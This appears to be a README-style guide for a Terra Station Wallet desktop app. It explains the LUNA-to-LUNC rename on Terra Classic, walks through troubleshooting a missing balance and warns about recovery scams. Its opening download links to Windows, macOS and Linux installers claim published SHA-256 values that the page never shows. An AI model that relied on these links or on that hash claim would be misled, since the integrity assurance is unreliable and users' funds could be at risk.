![Terra Station Wallet](assets/banner-article.png)

# Recovering Legacy LUNA as LUNC

<p align="center"><a href="https://github.com/terraclassic-wallet/terra-station-wallet/releases/tag/v2.5.13"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-5392F7?style=for-the-badge&labelColor=101A42&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=E2EAFB" alt="Download for Windows"></a> <a href="https://github.com/terraclassic-wallet/terra-station-wallet/releases/tag/v2.5.13"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-5392F7?style=for-the-badge&labelColor=101A42&logo=apple&logoColor=E2EAFB" alt="Download for macOS"></a> <a href="https://github.com/terraclassic-wallet/terra-station-wallet/releases/tag/v2.5.13"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-5392F7?style=for-the-badge&labelColor=101A42&logo=linux&logoColor=E2EAFB" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-5392F7?style=flat-square&labelColor=101A42&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=E2EAFB" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`terra-station-wallet-windows-v2.5.13.exe`](https://github.com/terraclassic-wallet/terra-station-wallet/releases/download/v2.5.13/terra-station-wallet-windows-v2.5.13.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-5392F7?style=flat-square&labelColor=101A42&logo=apple&logoColor=E2EAFB" alt="macOS"> | macOS 12 or later | [`terra-station-wallet-macos-v2.5.13.dmg`](https://github.com/terraclassic-wallet/terra-station-wallet/releases/download/v2.5.13/terra-station-wallet-macos-v2.5.13.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-5392F7?style=flat-square&labelColor=101A42&logo=linux&logoColor=E2EAFB" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`terra-station-wallet-linux-v2.5.13.zip`](https://github.com/terraclassic-wallet/terra-station-wallet/releases/download/v2.5.13/terra-station-wallet-linux-v2.5.13.zip) |

</div>

Every file in that table is attached to the [Terra Station Wallet release page](https://github.com/terraclassic-wallet/terra-station-wallet/releases/tag/v2.5.13), and the SHA-256 printed beside each name is the value published here.

> **Only download from this GitHub release page.** An installer offered anywhere else, however official it looks, is not a file this project published.

LUNC is the token formerly called LUNA on the original Terra chain. If you held LUNA before May 2022, that balance is LUNC now, at the same address, on Terra Classic - the chain that kept running. Nothing needs claiming, swapping or bridging, and no deadline applies.

## The rename, and what it did not do

| Then | Now | Where |
|---|---|---|
| LUNA | LUNC | Terra Classic |
| UST | USTC | Terra Classic |
| Terra | Terra Classic | The original chain, continued |

Renaming changed labels, tickers and the way the network is described. It did not move balances, snapshot wallets into a claim, or require holders to do anything. A phrase from 2021 still restores the same address with the same LUNC.

The confusion comes from the other side of the story: a new chain was launched, also using the name Terra, with a token called LUNA. That token has nothing to do with the balance you held before, and it was not distributed by converting old holdings automatically.

## Three things people mean by "recover my LUNA"

1. **"My old LUNA is showing as LUNC."** Nothing to do: that is the rename, and the balance is already yours.
2. **"My old LUNA is not showing at all."** A wallet or network problem, or a differently derived address - not a missing balance.
3. **"I want the new LUNA."** A different chain and a different question, outside this wallet's scope (https://github.com/terraclassic-wallet/terra-classic-wallet-guides/blob/main/terra-classic-vs-luna.md).

Only the second needs work, and the work is a check rather than an application.

## Working through a balance that is not showing

- **Network.** The wallet must be reading Terra Classic. Pointed at a different network it will not show this account's history (*Terra Classic vs Terra (LUNA): Which Chain Is Your Wallet On*).
- **Address.** Compare the restored address with the one the balance was held at. A different phrase produces a different address; a key import restores one account (*Seed Phrase vs Private Key: What Each One Restores*).
- **Read state.** A fresh installation can take minutes to finish its first read (*Account Not Loading in Terra Station Wallet*).
- **Staking.** Delegated LUNC sits in the staking view rather than the spendable balance, and an unbonding queue shows neither until it completes (*Unstaking LUNC and the 21-Day Unbonding*).
- **Explorer.** The independent check: look the address up on a Terra Classic explorer and see what it holds (*Using a Terra Classic Explorer*).

The explorer result splits the problem cleanly. Balance present there means the wallet is behind; balance absent means the address is not the one that held it.

## Scams built on this question

Because so many people search for it, the phrase "recover your old LUNA" attracts fraud:

- A site that offers to "migrate" old LUNA and asks for the phrase.
- A form that asks for the old address and a "recovery fee".
- A direct message claiming to be from the project, offering to restore balances manually.
- An app store listing that mimics the wallet and requests the phrase on first launch.

None of these can do anything legitimate, because the balance was never lost. The wallet's own import screen is the only place a phrase belongs, and the current release is the only build to use (https://github.com/terraclassic-wallet/terra-classic-wallet-guides/blob/main/is-terra-station-wallet-safe.md).

## What about airdropped tokens claiming to be for LUNC holders?

Some projects have distributed tokens to Terra Classic addresses, and some of those distributions are real while others are bait. The wallet does not adjudicate them, and a token appearing in a wallet is not itself proof of value.

Treat unsolicited tokens as data, not as an opportunity: do not interact with contracts they point to, and do not connect a wallet to a site because a token told you to. https://github.com/terraclassic-wallet/terra-classic-wallet-guides/blob/main/terra-station-upgrade-scam.md covers the shapes this takes.

## If the phrase is gone

This is the case where nothing in this page helps, and it is worth stating plainly rather than implying otherwise. Without the phrase or the key for that address, there is no route back: the balance sits at an address nobody can sign for, and it stays there.

No service, fee, form or "recovery specialist" changes that, because the security model is the point. What people in this situation usually need is confirmation, not another search - and the confirmation is that the funds are visible on chain and unreachable without the key. Anyone claiming otherwise is selling something.

If part of the phrase survived - say, one copy was damaged but another exists - restoring is worth attempting before concluding anything, since a single misread word is the usual cause of a failed restore, not a lost wallet.

## A checklist that ends the question

1. Do you still have the phrase (or key) for the address that held the LUNA?
2. Does the restored address match the one you held the balance at?
3. Is the wallet on Terra Classic?
4. Does a Terra Classic explorer show the LUNC balance?
5. Is any of it staked or unbonding?

Answer those and the situation is decided. If the phrase is gone, no process - paid, official-looking or otherwise - can rebuild the wallet, and any offer to do so is a scam.

## Questions people ask

### Is LUNC the same as the old LUNA?

Yes, on Terra Classic. The token was renamed and the chain renamed with it; the balance at your address did not move.

### Do I have to do anything to claim it?

No. Import the phrase into a current wallet on Terra Classic and the balance appears. There is no claim, no deadline and no fee beyond ordinary network fees when you send.

### Why do I see a different token also called LUNA?

That is the new chain's token. It is a separate network, not a renamed version of your old balance.

### Can I convert LUNC into the new LUNA?

Not in this wallet. It does not bridge between the two chains, and converting would mean an exchange or a bridge outside its scope.

A last check that costs nothing: search the address on a second explorer before concluding anything. Two independent reads of the same chain agreeing is the point at which the question is settled, and it takes less time than reading one more forum thread about it.
